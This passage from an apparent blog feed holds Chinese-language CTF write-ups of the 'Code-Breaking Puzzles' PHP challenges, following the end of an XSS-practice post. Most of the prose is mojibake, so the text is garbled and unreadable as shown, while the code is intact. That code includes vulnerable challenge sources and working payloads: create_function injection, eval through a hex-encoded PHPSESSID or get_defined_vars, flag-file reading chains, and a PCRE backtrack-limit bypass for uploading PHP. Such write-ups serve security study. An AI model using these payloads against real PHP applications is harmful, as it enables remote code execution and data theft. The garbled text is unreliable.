alt="kzXjKg.png"></p><p>è¿™é‡Œæˆ‘ä»¥å°æ¸¸æˆç¬¬ä¸€å…³ä¸ºä¾‹ï¼Œç°åœ¨å°±å¯ä»¥ä½¿ç”¨bpæŠ“åŒ…å‘é€è‡³çˆ†ç ´æ¨¡å—ï¼Œç„¶åé€‰æ‹©æ’ä»¶æ¨¡å¼ï¼Œé€‰æ‹©æˆ‘ä»¬çš„æ’ä»¶</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjQG6.png" alt="kzjQG6.png"></p><p>ç„¶åå»åˆ°è¯¥æ’ä»¶çš„é¡µé¢å¤åˆ¶å®ƒçš„ç‰¹å¾ç ï¼ŒåŠ è½½è¿›å»å­—å…¸ä¸­</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjUII.png" alt="kzjUII.png"></p><p><img src="https://s2.ax1x.com/2019/03/08/kzjxSK.png" alt="kzjxSK.png"></p><p>ç‚¹å‡»attackï¼Œæ”»å‡»æˆåŠŸçš„è¯ä¼šæ˜¾ç¤ºï¼ŒåŒæ—¶ç›‘å¬ä¹Ÿä¼šå‡ºç°æŠ¥æ–‡çš„å›æ˜¾</p><p><img src="https://s2.ax1x.com/2019/03/08/kzvkFI.png" alt="kzvkFI.png"></p><p><img src="https://s2.ax1x.com/2019/03/08/kzvZSf.png" alt="kzvZSf.png"></p><p>è¿™æ ·å»æµ‹è¯•å°±æ¯”å¹³å¸¸æ‰‹å·¥æµ‹è¯•è¦ä¾¿æ·å¤šäº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘åœ¨ç»ƒä¹ xssï¼Œæ„Ÿè§‰è¿™ä¸ªæ¸¸æˆæŒºé€‚åˆæ–°æ‰‹çš„ï¼Œä»ä»£ç å±‚è§’åº¦åˆ†ææ›´åŠ æ·±åˆ»è®¤è¯†xssçš„å½¢æˆï¼Œ
    
    </summary>
    
      <category term="xss" scheme="0verwatch.top/categories/xss/"/>
    
    
      <category term="xss" scheme="0verwatch.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking-Puzzleså­¦ä¹ </title>
    <link href="0verwatch.top/Code-Breaking-Puzzles-Learning.html"/>
    <id>0verwatch.top/Code-Breaking-Puzzles-Learning.html</id>
    <published>2019-02-27T12:48:46.000Z</published>
    <updated>2019-03-04T13:54:41.136Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ³¢åˆ·é¢˜ä¸»è¦ä»¥å­¦ä¹ ä¸ºä¸»ï¼Œå¤ç°ä¸ºä¸»ï¼ŒçŸ¥è¯†ç‚¹çœŸçš„å¤ªæ£’äº†<a id="more"></a>23333</p><h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p>è¿™ä¸ªé¢˜ç›®çš„ç‚¹å¾ˆæœ‰æ„æ€æ˜¯å…³äº<code>create_function</code>è¿™ä¸ªå‡½æ•°çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç†è§£ä¸€ä¸‹ä»£ç å°±æ˜¯å…ˆå¾—ç»•è¿‡ä¸€ä¸ªæ­£åˆ™ï¼Œè¿™ä¸ªæ­£åˆ™åªæœ‰æ»¡è¶³ä¸æ˜¯å­—æ¯æ•°å­—ä»¥åŠä¸‹åˆ’çº¿æ‰èƒ½ç»•è¿‡ï¼Œæ‰å­˜åœ¨ä¸€ä¸ªå¯æ§å‚æ•°çš„å‡½æ•°è°ƒç”¨ï¼Œä½†æ˜¯æƒ³ä¸åˆ°æ€ä¹ˆç»•è¿‡çš„è¯ï¼Œå¯ä»¥ç”¨<code>var_dump</code>å‡½æ•°å°è¯•fuzzä¸€ä¸‹ï¼Œå¯ä»¥å¾—åˆ°<code>\</code>è¿™ä¸ªç¬¦å·æ˜¯å¯ä»¥ç»•è¿‡çš„</p><p><img src="https://s2.ax1x.com/2019/02/25/kIZ0GF.png" alt="kIZ0GF.png"></p><p>ä¸ºä»€ä¹ˆå¯ä»¥ç»•è¿‡ï¼Œpç¥åœ¨å°å¯†åœˆä¸­æœ‰è¯´è¿‡</p><p><img src="https://s2.ax1x.com/2019/02/25/kIZa5T.png" alt="kIZa5T.png"></p><p>ä¹Ÿå°±æ˜¯ä¸€ä¸ªå‘½åç©ºé—´çš„é—®é¢˜ï¼Œä»€ä¹ˆæ˜¯å‘½åç©ºé—´ï¼Ÿå¯ä»¥äº†è§£ä¸€ä¸‹<a href="http://php.net/manual/zh/language.namespaces.definition.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.namespaces.definition.php</a></p><p>ä½†æ˜¯æ¥ä¸‹æ¥éœ€è¦ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œç”±äºPHP7çš„ç‰ˆæœ¬å¯¹äºå±é™©å‡½æ•°åšäº†å¾ˆå¤šé™åˆ¶ï¼Œä½†è¿˜æ˜¯å¯ä»¥ä½¿ç”¨<code>create_function</code>è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–°æ„å»ºå‡½æ•°çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä»£ç å†…å®¹ï¼Œè¿™ä¸ªå‡½æ•°çš„åˆ©ç”¨ç‚¹åœ¨å“ªï¼Ÿå¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« <a href="https://blog.51cto.com/lovexm/1743442ï¼Œæœ¬è´¨å°±æ˜¯å°†ç¬¬ä¸€ä¸ªå‚æ•°ä»¥åŠç¬¬äºŒä¸ªå‚æ•°åˆ†åˆ«åˆå¹¶è€Œå·²ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ä¸€ä¸‹åº•å±‚çš„ä»£ç ï¼Œå°±æ˜¯é—­åˆä¸‹é¢è¿™å¥å‡½æ•°" target="_blank" rel="noopener">https://blog.51cto.com/lovexm/1743442ï¼Œæœ¬è´¨å°±æ˜¯å°†ç¬¬ä¸€ä¸ªå‚æ•°ä»¥åŠç¬¬äºŒä¸ªå‚æ•°åˆ†åˆ«åˆå¹¶è€Œå·²ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ä¸€ä¸‹åº•å±‚çš„ä»£ç ï¼Œå°±æ˜¯é—­åˆä¸‹é¢è¿™å¥å‡½æ•°</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function __lambda_func ( function_args ) &#123; function_code &#125; \<span class="number">0</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯¹äºä¸¤ä¸ªå‚æ•°å°±æœ‰ä¸¤ç§é—­åˆæ–¹å¼</p><ol><li>å¦‚æœå¯æ§åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œéœ€è¦é—­åˆåœ†æ‹¬å·å’Œå¤§æ‹¬å·ï¼š<code>create_function(&#39;){}phpinfo();//&#39;, &#39;&#39;);</code></li><li>å¦‚æœå¯æ§åœ¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œéœ€è¦é—­åˆå¤§æ‹¬å·ï¼š<code>create_function(&#39;&#39;, &#39;}phpinfo();//&#39;);</code></li></ol><p>çªç„¶è§‰å¾—å­—ç¬¦ä¸²æ‹¼æ¥æå…¶ä¸å®‰å…¨ã€‚ã€‚ã€‚åªè¦ä¸€é—­åˆå°±å¯ä»¥åˆ›é€ ç‚¹å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œå› ä¸ºè¿™é‡Œé¢æ˜¯php7ï¼Œå±é™©å‡½æ•°ä¸èƒ½ç”¨äº†ï¼Œå¦‚æœæ‹¿åˆ°çš„æ˜¯webshellï¼Œä¹Ÿå¯ä»¥ç”¨phpçš„scandirã€globç­‰å‡½æ•°æ¥éå†ç›®å½•æ¥æ‰¾flagã€‚</p><p>æœ€åå¯ä»¥æ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=&#125;var_dump(scandir(%27../%27));//</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=&#125;var_dump(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;));//</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/25/kImOgg.png" alt="kImOgg.png"></p><h3 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy-pcrewaf"></a>easy-pcrewaf</h3><p>è¿™ä¸ªé¢˜ç›®æ˜¯æœ‰å…³æ­£åˆ™çš„ä¸€ä¸ªç»•è¿‡ï¼Œè¯¦ç»†çš„åŸç†å¯ä»¥çœ‹çœ‹pç¥çš„è¿™ç¯‡æ–‡ç« :<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlã€‚" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlã€‚</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºè¿™ä¸ªæ­£åˆ™ï¼Œå°±æ˜¯ä¸ºè®©PHPä»£ç ä¸èƒ½å¤Ÿå®ç°é—­åˆï¼Œä¹Ÿå°±æ˜¯æœ€åä¸èƒ½å‡ºç°(`;?&gt;è¿™å‡ ä¸ªç¬¦å·ï¼Œé‚£æ€ä¹ˆç»•è¿‡ï¼Ÿpç¥ç»™å‡ºäº†è¿™æ ·çš„è§£é‡Šï¼Œç”±äºæ­£åˆ™æœ‰ä¸¤ç§åŒ¹é…æ¨¡å¼</p><blockquote><ul><li>DFA: ä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶æ ¹æ®æ­£åˆ™æ¥ä¸€æ­¥æ­¥ç¡®å®šè‡³ä¸‹ä¸€ä¸ªè½¬ç§»çŠ¶æ€ï¼Œç›´åˆ°åŒ¹é…ä¸ä¸Šæˆ–èµ°å®Œæ•´ä¸ªè¾“å…¥</li><li>NFAï¼šä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶ä¸æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œåˆ™è¿›è¡Œå›æº¯ï¼Œå°è¯•å…¶ä»–çŠ¶æ€</li></ul></blockquote><p>è€Œphpçš„PCREåº“ä½¿ç”¨çš„å°±æ˜¯NFAçš„æ­£åˆ™å¼•æ“ï¼ŒPç¥çš„debugè¿‡ç¨‹å¾ˆè¯¦ç»†å°±ä¸å¤šè¯´ä»€ä¹ˆäº†ã€‚</p><p>PHPä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œä¸å¯èƒ½è®©ä½ ä¸€ç›´å›æº¯æµªè´¹èµ„æºï¼Œç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™<code>pcre.backtrack_limit</code>ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>çš„æ–¹å¼æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸‹çš„ä¸Šé™(å¦‚ä¸‹å›¾)ï¼š</p><p><img src="https://s2.ax1x.com/2019/02/27/kTgHij.png" alt="kTgHij.png"></p><p><img src="https://s2.ax1x.com/2019/02/27/kTgjyV.png" alt="kTgjyV.png"></p><p>æ‰€ä»¥å›æº¯çš„ä¸Šé™æ˜¯1000000ï¼Œå¦‚æœè¶…è¿‡1000000å°±ä¼šè¿”å›falseäº†</p><p><img src="https://s2.ax1x.com/2019/02/27/kT2QfA.png" alt="kT2QfA.png"></p><p>è¿™æ ·ç­”æ¡ˆå°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªç‰¹æ€§å»ç»•è¿‡ï¼Œå‘åŒ…å³å¯</p><p><img src="https://s2.ax1x.com/2019/02/27/kTfWtg.png" alt="kTfWtg.png"></p><p><img src="https://s2.ax1x.com/2019/02/27/kTfXh4.png" alt="kTfXh4.png"></p><p>æ€ä¹ˆé˜²å¾¡ï¼Ÿ</p><p>å¯ä»¥ä½¿ç”¨<code>===</code>å»é˜²å¾¡ï¼Œå› ä¸º<code>preg_match</code>è¿™ä¸ªå‡½æ•°åªä¼šè¿”å›ä¸‰ä¸ªå€¼1æˆ–è€…0æˆ–è€…falseï¼Œå¯ä»¥çœ‹çœ‹è¿™å¥è¯</p><blockquote><p>returns 1 if the <code>pattern</code><br>matches given <code>subject</code>, 0 if it does not, or <strong>FALSE</strong><br>if an error occurred.</p></blockquote><p><img src="https://s2.ax1x.com/2019/02/27/kThKDP.png" alt="kThKDP.png"></p><p>æ‰€ä»¥å½“å‡ºç°falseè¿™ç§æƒ…å†µçš„æ—¶å€™ï¼Œåªè¦<code>===</code>å­˜åœ¨å°±ä¸ä¼šå­˜åœ¨å¼±ç±»å‹çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">0</span>)&#123; </span><br><span class="line">    write ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h3><p>å¤§ä½¬ä»¬çš„éªšæ“ä½œåˆå­¦ä¹ äº†ï¼Œé¢˜ç›®æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­çš„ï¼Œç„¶åè§‚å¯Ÿä¸€ä¸‹è¿™ä¸ªæ­£åˆ™ï¼Œå°±æ˜¯åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œä½†ä¸èƒ½è®¾ç½®å‚æ•°ã€‚</p><p>åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢æœ‰æåŠ<a href="https://lorexxar.cn/2018/05/23/rctf2018/ï¼Œè¿™ç¯‡æ–‡ç« ç”¨çš„æ˜¯`next(getallheaders())`ï¼Œé€šè¿‡è·å–å¤´éƒ¨ä¿¡æ¯å»å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æœ‰ä½¿ç”¨çš„æ˜¯NginxæœåŠ¡å™¨ï¼Œè€Œä¸”`getallheaders()`è¿™ä¸ªå‡½æ•°`getallheaders`å‡½æ•°æ˜¯apacheæ¨¡å—çš„å‡½æ•°ï¼Œæ‰€ä»¥å¾—å¦å¯»åŠæ³•ã€‚" target="_blank" rel="noopener">https://lorexxar.cn/2018/05/23/rctf2018/ï¼Œè¿™ç¯‡æ–‡ç« ç”¨çš„æ˜¯`next(getallheaders())`ï¼Œé€šè¿‡è·å–å¤´éƒ¨ä¿¡æ¯å»å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æœ‰ä½¿ç”¨çš„æ˜¯NginxæœåŠ¡å™¨ï¼Œè€Œä¸”`getallheaders()`è¿™ä¸ªå‡½æ•°`getallheaders`å‡½æ•°æ˜¯apacheæ¨¡å—çš„å‡½æ•°ï¼Œæ‰€ä»¥å¾—å¦å¯»åŠæ³•ã€‚</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å¤§ä½¬ä»¬çš„wpä¹Ÿæ˜¯æƒŠå‘†äº†ï¼Œéƒ½è®°å½•ä¸€ä¸‹ï¼Œ</p><h4 id="æ–¹æ³•ä¸€-åˆ©ç”¨session-id"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨session-id" class="headerlink" title="æ–¹æ³•ä¸€:åˆ©ç”¨session_id"></a>æ–¹æ³•ä¸€:åˆ©ç”¨session_id</h4><p>è¿™ä¸ªå‡½æ•°å¤§çš„ä½œç”¨ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.ax1x.com/2019/02/26/kodsJS.png" alt="kodsJS.png"></p><p>ä¹Ÿå°±æ˜¯è·å–PHPSESSIDçš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶PHPSESSIDçš„å†…å®¹ï¼Œä»è€Œè¿›è¡Œç›¸å…³çš„å‘½ä»¤æ‰§è¡Œï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯PHPSESSIDçš„å†…å®¹å¯èƒ½æœ‰å­—ç¬¦çš„é™åˆ¶ï¼Œä½†æ˜¯å½±å“ä¸å¤§ï¼Œæ‰€ä»¥æœ€å¥½è¿˜æ˜¯è½¬æˆ16è¿›åˆ¶å»æ“ä½œ</p><p><img src="https://s2.ax1x.com/2019/02/26/kowPQH.png" alt="kowPQH.png"></p><p>æ‰€ä»¥æœ€åçš„æ“ä½œæ˜¯è¿™æ ·çš„</p><p>GETå‚æ•°é‡Œé¢çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure><p>PHPSESSIDé‡Œé¢çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=7072696E745F72287363616E64697228272E2E2F2729293B</span><br><span class="line">#print_r(scandir(&apos;../&apos;));</span><br><span class="line">PHPSESSID=7072696E745F722866696C655F6765745F636F6E74656E747328272E2E2F666C61675F7068706279703473732729293B</span><br><span class="line">#print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/kowRpD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/kowRpD.md.png" alt="kowRpD.md.png"></a></p><h4 id="æ–¹æ³•äºŒ-åˆ©ç”¨get-defined-vars"><a href="#æ–¹æ³•äºŒ-åˆ©ç”¨get-defined-vars" class="headerlink" title="æ–¹æ³•äºŒ:åˆ©ç”¨get_defined_vars"></a>æ–¹æ³•äºŒ:åˆ©ç”¨get_defined_vars</h4><p><img src="https://s2.ax1x.com/2019/02/26/ko0HbR.png" alt="ko0HbR.png"></p><p>è¿™ä¸ªå‡½æ•°å¥½åƒåœ¨æŸæ¬¡çš„å®‰æ’æœˆèµ›é‡Œé¢å‡ºç°è¿‡ï¼Œå½“æ—¶ä¹Ÿæ˜¯å­¦ä¹ äº†ï¼Œä½†æ˜¯ä»Šå¤©å†æ¬¡ç¢°åˆ°ï¼Œåªèƒ½æ€ªè‡ªå·±æ²¡æœ‰çµæ´»è¿ç”¨ï¼Œå¯¼è‡´å°è±¡ä¸æ·±ï¼Œç°åœ¨å†æ¬¡ä½¿ç”¨äº†23333</p><p>æ—¢ç„¶æ˜¯è¿”å›å·²å®šä¹‰çš„æ•°ç»„é‚£ä¹ˆGETæ•°ç»„ä¹Ÿè‚¯å®šåŒ…å«åœ¨é‡Œé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥getä¼ å‚å°±å¯ä»¥ï¼Œç„¶åå¯ä»¥æ ¹æ®<code>current</code>ä»¥åŠ<code>next</code>å‡½æ•°å»è½¬ç§»åˆ°ä½ æ‰€éœ€è¦çš„å‚æ•°ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(next(current(get_defined_vars())));&amp;1=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/27/kTVN3F.png" alt="kTVN3F.png"></p><p>å¦å¤–åœ¨php 7.1ä¸‹ï¼Œ<code>getenv()</code>å‡½æ•°æ–°å¢äº†æ— å‚æ•°æ—¶ä¼šè·å–æœåŠ¡æ®µçš„envæ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™ä¹Ÿå¯ä»¥åˆ©ç”¨</p><p>è¿˜æœ‰å…¶ä»–å¤§ä½¬çš„payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><p>ç›´æ¥åˆ—ç›®å½•ï¼Œè¿™é‡Œæœ‰ä¸ªå‡½æ•°åˆ©ç”¨çš„å¾ˆå·§å¦™ï¼Œå°±æ˜¯<code>array_reverse</code>ï¼Œè¿™ä¸ªå‡½æ•°æ°å¥½æŠŠæ•°ç»„é‡Œé¢çš„å†…å®¹å€’è½¬è¿‡æ¥ï¼Œåˆšå¥½å¯ä»¥ä½¿ç”¨ä¸€æ¬¡nextå‡½æ•°ï¼Œä¸ç„¶çš„è¯è°ƒç”¨æ•°ç»„é‡Œé¢çš„ç¬¬ä¸‰ä¸ªå€¼çš„è¯ï¼Œå°±è¦ä½¿ç”¨å¤šæ¬¡nextå°±æ˜¾å¾—å†—ä½™äº†ã€‚</p><h3 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h3><p>è¿™ä¸ªé¢˜ç›®æ˜¯å…³äºå†™æ–‡ä»¶çš„ï¼Œå…ˆæŠŠæºç æ‹¿å‡ºæ¥ç…ç…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line"> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œé¢å†™æ–‡ä»¶è¿›å»çš„æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br></pre></td></tr></table></figure><p>æ˜¯ç”±ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆçš„ï¼Œç¬¬ä¸€ä¸ªéƒ¨åˆ†æ˜¯<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶çš„<code>$log_name</code>ï¼Œè¿™é‡Œæ¶‰åŠçš„çŸ¥è¯†ç‚¹æ˜¯åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå¦‚æœæœåŠ¡å™¨è¨­ç½®äº†ä¸‹é¢çš„ç›¸é—œåƒæ•¸çš„è¯å°±æ˜¯å¯æ§çš„ï¼Œé€™å€‹å¯æ§çš„åƒæ•¸è¿™ä¸ªå€¼æ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚æ€ä¹ˆä¼ªé€ å‘¢ï¼Ÿå–çš„æ˜¯HTTP headersä¸­çš„<code>Host</code>çš„å€¼ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/04/kO4ySf.png" 